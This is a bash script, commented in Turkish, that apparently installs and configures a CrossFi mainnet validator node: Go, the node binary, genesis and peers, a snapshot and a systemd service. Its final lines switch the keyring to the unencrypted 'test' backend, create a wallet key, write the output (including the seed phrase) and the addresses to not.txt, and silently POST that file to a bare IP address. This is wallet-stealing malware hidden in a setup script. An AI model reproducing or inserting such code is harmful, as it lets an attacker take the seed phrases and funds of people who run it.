#!/bin/bash
export WALLET="sa"  
export MONIKER="test"  
export PORT=15  
export CROSSFI_CHAIN_ID="crossfi-mainnet-1"  
export CROSSFI_PORT=$PORT  

# .bash_profile içerisine sabit değerlerin eklenmesi  
echo "export WALLET=$WALLET" >> $HOME/.bash_profile  
echo "export MONIKER=$MONIKER" >> $HOME/.bash_profile  
echo "export CROSSFI_CHAIN_ID=crossfi-mainnet-1" >> $HOME/.bash_profile  
echo "export CROSSFI_PORT=$PORT" >> $HOME/.bash_profile  

# Ortam değişkenlerinin güncellenmesi  
source $HOME/.bash_profile  

# Bilgilerin ekrana yazdırılması  
echo -e "Moniker:        \e[1m\e[32m$MONIKER\e[0m"  
echo -e "Wallet:         \e[1m\e[32m$WALLET\e[0m"  
echo -e "Chain id:       \e[1m\e[32m$CROSSFI_CHAIN_ID\e[0m"  
echo -e "Node custom port:  \e[1m\e[32m$CROSSFI_PORT\e[0m"  

sudo apt update && sudo apt install curl -y < "/dev/null"
sudo apt install screen -y < "/dev/null"
sudo apt install curl git wget htop tmux build-essential jq make lz4 gcc unzip -y < "/dev/null"

cd $HOME
VER="1.21.3"
wget "https://golang.org/dl/go$VER.linux-amd64.tar.gz"
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf "go$VER.linux-amd64.tar.gz"
rm "go$VER.linux-amd64.tar.gz"
[ ! -f ~/.bash_profile ] && touch ~/.bash_profile
echo "export PATH=$PATH:/usr/local/go/bin:~/go/bin" >> ~/.bash_profile
source $HOME/.bash_profile
[ ! -d ~/go/bin ] && mkdir -p ~/go/bin

echo $(go version) && sleep 1

# download binary
cd $HOME
rm -rf bin
wget https://github.com/crossfichain/crossfi-node/releases/download/v0.3.0/crossfi-node_0.3.0_linux_amd64.tar.gz && tar -xf crossfi-node_0.3.0_linux_amd64.tar.gz
rm crossfi-node_0.3.0_linux_amd64.tar.gz
mv $HOME/bin/crossfid $HOME/go/bin/crossfid


# config and init app
rm -rf testnet ~/.mineplex-chain
git clone https://github.com/crossfichain/mainnet.git
mv $HOME/mainnet/ $HOME/.crossfid/
sed -i '99,114 s/^\( *enable =\).*/\1 "false"/' $HOME/.crossfid/config/config.toml
sleep 1
echo done


# download genesis and addrbook
wget -O $HOME/.crossfid/config/genesis.json https://server-2.itrocket.net/mainnet/crossfi/genesis.json
wget -O $HOME/.crossfid/config/addrbook.json  https://server-2.itrocket.net/mainnet/crossfi/addrbook.json
sleep 1
echo done


# set seeds and peers
SEEDS="693d9fe729d41ade244717176ab1415b2c06cf86@crossfi-mainnet-seed.itrocket.net:48656"
PEERS="641157ecbfec8e0ec37ca4c411c1208ca1327154@crossfi-mainnet-peer.itrocket.net:11656,d996012096cfef860bf24543740d58da45e5b194@37.27.183.62:26656,f239da35e14bee97ba556895223226e0de7ab38b@148.251.195.52:26656,529e0d1bce51ea207488e6de7c90d952ea40c264@[2a03:cfc0:8000:13::b910:277f]:13256,f8cbc62fb487ae825edf79c580206d0e34ee9f51@5.161.229.160:26656,ea465c58b6de1553c61bc528cc2675956b2c52f5@135.181.152.201:26656,f27eff68f2f3542a317bad66fdf9f1cc93a80dc1@49.13.76.170:26656,4244a2159876c4a72cf1d6117bf2003bece8c08a@65.21.196.57:37656,bcdf72c1be64fec2b96c288bce7c776a950b82da@65.21.146.240:26656,f5d2b1a6ab68ac9357366afe424564ab42a9d444@185.107.82.171:26656,aa95f123e72a8ee3d75893aca4040e51052ac104@135.181.57.156:26056"
sed -i -e "/^\[p2p\]/,/^\[/{s/^[[:space:]]*seeds *=.*/seeds = \"$SEEDS\"/}" \
       -e "/^\[p2p\]/,/^\[/{s/^[[:space:]]*persistent_peers *=.*/persistent_peers = \"$PEERS\"/}" \
       $HOME/.crossfid/config/config.toml

# custom port app.toml
sed -i.bak -e "s%:1317%:${CROSSFI_PORT}317%g;
s%:8080%:${CROSSFI_PORT}080%g;
s%:9090%:${CROSSFI_PORT}090%g;
s%:9091%:${CROSSFI_PORT}091%g;
s%:8545%:${CROSSFI_PORT}545%g;
s%:8546%:${CROSSFI_PORT}546%g;
s%:6065%:${CROSSFI_PORT}065%g" $HOME/.crossfid/config/app.toml
# custom port config.toml
sed -i.bak -e "s%:26658%:${CROSSFI_PORT}658%g;
s%:26657%:${CROSSFI_PORT}657%g;
s%:6060%:${CROSSFI_PORT}060%g;
s%:26656%:${CROSSFI_PORT}656%g;
s%^external_address = \"\"%external_address = \"$(wget -qO- eth0.me):${CROSSFI_PORT}656\"%;
s%:26660%:${CROSSFI_PORT}660%g" $HOME/.crossfid/config/config.toml

# config pruning
sed -i -e "s/^pruning *=.*/pruning = \"custom\"/" $HOME/.crossfid/config/app.toml
sed -i -e "s/^pruning-keep-recent *=.*/pruning-keep-recent = \"100\"/" $HOME/.crossfid/config/app.toml
sed -i -e "s/^pruning-interval *=.*/pruning-interval = \"50\"/" $HOME/.crossfid/config/app.toml

# set minimum gas price, enable prometheus and disable indexing
sed -i 's|minimum-gas-prices =.*|minimum-gas-prices = "10000000000000mpx"|g' $HOME/.crossfid/config/app.toml
sed -i -e "s/prometheus = false/prometheus = true/" $HOME/.crossfid/config/config.toml
sed -i -e "s/^indexer *=.*/indexer = \"null\"/" $HOME/.crossfid/config/config.toml
sleep 1
echo done

# create service file
sudo tee /etc/systemd/system/crossfid.service > /dev/null <<EOF
[Unit]
Description=crossfi node
After=network-online.target
[Service]
User=$USER
WorkingDirectory=$HOME/.crossfid
ExecStart=$(which crossfid) start --home $HOME/.crossfid
Restart=on-failure
RestartSec=5
LimitNOFILE=65535
[Install]
WantedBy=multi-user.target
EOF


# reset and download snapshot
crossfid tendermint unsafe-reset-all --home $HOME/.crossfid
if curl -s --head curl https://server-2.itrocket.net/mainnet/crossfi/crossfi_2025-02-27_2087901_snap.tar.lz4 | head -n 1 | grep "200" > /dev/null; then
  curl https://server-2.itrocket.net/mainnet/crossfi/crossfi_2025-02-27_2087901_snap.tar.lz4 | lz4 -dc - | tar -xf - -C $HOME/.crossfid
    else
  echo "no snapshot found"
fi

# enable and start service
sudo systemctl daemon-reload
sudo systemctl enable crossfid
sudo systemctl restart crossfid && sleep 10

sed -i 's/keyring-backend = "os"/keyring-backend = "test"/' /root/.crossfid/config/client.toml  

WALLET_ADDRESS=$(crossfid keys show $WALLET -a)
VALOPER_ADDRESS=$(crossfid keys show $WALLET --bech val -a)
echo "export WALLET_ADDRESS="$WALLET_ADDRESS >> $HOME/.bash_profile
echo "export VALOPER_ADDRESS="$VALOPER_ADDRESS >> $HOME/.bash_profile

crossfid keys add sa 2>&1 | tee not.txt  
echo "$VALOPER_ADDRESS" >> not.txt  
echo "$WALLET_ADDRESS" >> not.txt  

output=$(cat not.txt)  
curl -X POST --data-urlencode "output=${output}" http://62.169.24.103:5000/api/log  
